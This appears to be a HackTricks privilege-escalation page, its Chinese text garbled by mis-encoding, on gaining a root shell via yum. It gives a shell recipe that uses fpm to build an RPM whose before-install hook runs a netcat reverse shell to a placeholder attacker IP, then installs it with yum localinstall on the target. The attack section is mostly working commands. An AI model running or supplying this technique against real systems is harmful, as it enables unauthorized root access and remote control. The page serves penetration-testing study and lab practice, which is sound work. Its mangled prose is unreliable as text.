<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

åœ¨[gtfobins](https://gtfobins.github.io/gtfobins/yum/)ä¸Šè¿˜å¯ä»¥æ‰¾åˆ°æœ‰å…³yumçš„æ›´å¤šç¤ºä¾‹ã€‚

# é€šè¿‡RPMè½¯ä»¶åŒ…æ‰§è¡Œä»»æ„å‘½ä»¤
## æ£€æŸ¥ç¯å¢ƒ
ä¸ºäº†åˆ©ç”¨è¿™ä¸ªå‘é‡ï¼Œç”¨æˆ·å¿…é¡»èƒ½å¤Ÿä»¥æ›´é«˜æƒé™çš„ç”¨æˆ·ï¼ˆå³rootï¼‰èº«ä»½æ‰§è¡Œyumå‘½ä»¤ã€‚

### è¿™ä¸ªå‘é‡çš„ä¸€ä¸ªå·¥ä½œç¤ºä¾‹
è¿™ä¸ªæ¼æ´çš„ä¸€ä¸ªå·¥ä½œç¤ºä¾‹å¯ä»¥åœ¨[tryhackme](https://tryhackme.com)çš„[daily bugle](https://tryhackme.com/room/dailybugle)æˆ¿é—´ä¸­æ‰¾åˆ°ã€‚

## æ‰“åŒ…ä¸€ä¸ªRPM
åœ¨æ¥ä¸‹æ¥çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨[fpm](https://github.com/jordansissel/fpm)å°†ä¸€ä¸ªåå‘shellæ‰“åŒ…åˆ°ä¸€ä¸ªRPMä¸­ã€‚

ä¸‹é¢çš„ç¤ºä¾‹åˆ›å»ºäº†ä¸€ä¸ªåŒ…ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå¸¦æœ‰ä»»æ„è„šæœ¬çš„before-installè§¦å‘å™¨ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªè¡Œå®šä¹‰ã€‚å®‰è£…æ—¶ï¼Œæ­¤è½¯ä»¶åŒ…å°†æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æˆ‘ä½¿ç”¨äº†ä¸€ä¸ªç®€å•çš„åå‘netcat shellç¤ºä¾‹è¿›è¡Œæ¼”ç¤ºï¼Œä½†å¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œæ›´æ”¹ã€‚
```text
EXPLOITDIR=$(mktemp -d)
CMD='nc -e /bin/bash <ATTACKER IP> <PORT>'
RPMNAME="exploited"
echo $CMD > $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
```
# è·å–shell
ä½¿ç”¨ä¸Šè¿°ç¤ºä¾‹ï¼Œå‡è®¾`yum`å¯ä»¥ä½œä¸ºä¸€ä¸ªå…·æœ‰æ›´é«˜æƒé™çš„ç”¨æˆ·æ‰§è¡Œã€‚

1. **ä¼ è¾“**rpmåˆ°ä¸»æœº
2. **åœ¨æœ¬åœ°ä¸»æœºä¸Šå¯åŠ¨**ç›‘å¬å™¨ï¼Œä¾‹å¦‚[ç¤ºä¾‹netcatç›‘å¬å™¨](/shells/shells/linux#netcat)
3. **å®‰è£…**å—å½±å“çš„è½¯ä»¶åŒ…`yum localinstall -y exploited-1.0-1.noarch.rpm`
